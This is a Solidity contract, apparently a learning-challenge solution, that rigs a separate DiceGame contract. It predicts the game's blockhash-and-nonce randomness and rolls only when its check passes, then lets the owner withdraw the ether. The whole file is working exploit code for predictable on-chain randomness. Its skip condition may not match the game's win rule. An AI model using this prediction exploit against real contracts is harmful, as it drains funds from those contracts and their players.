pragma solidity >=0.8.0 <0.9.0;
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {
    error NotEnoughEther();

    event Roll(address indexed player, uint256 amount, uint256 roll);
    event Winner(address winner, uint256 amount);
    DiceGame public diceGame;
    //uint256 public price = 0.002 ether; Sets a price

    constructor(address payable diceGameAddress) {
        diceGame = DiceGame(diceGameAddress);
    }

/* A view function for getting block difficulty!
    funtion getDifficulty() public view returns (uint256) {
        return block.difficulty;

    }*/

    //Add withdraw function to transfer ether from the rigged contract to an address
    function withdraw(address __addr, uint256 amount) public payable {
        require(__addr == owner(), "Only the owner can withdraw");
        (bool sent, ) = __addr.call{value: amount}("");
        require(sent, "Failed to send Ether");
    }

    //Add riggedRoll() function to predict the randomness in the DiceGame contract and only roll when it's going to be a winner
    function riggedRoll() public payable {
        require(msg.value >= 0.002 ether, "Failed to send enough value");
        //price = price * 101 / 100; We could require that 0.002 ether to be price curved like this

        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(
            abi.encodePacked(prevHash, address(diceGame), diceGame.nonce())
        );
        uint256 roll = uint256(hash) % 16;
        if (roll <= 2) {
            return;
        }
        console.log("THE RIGGED ROLL IS ", roll);
        diceGame.rollTheDice{value: 2000000000000000 wei}();

    }

    //Add receive() function so contract can receive Eth
    receive() external payable {}
}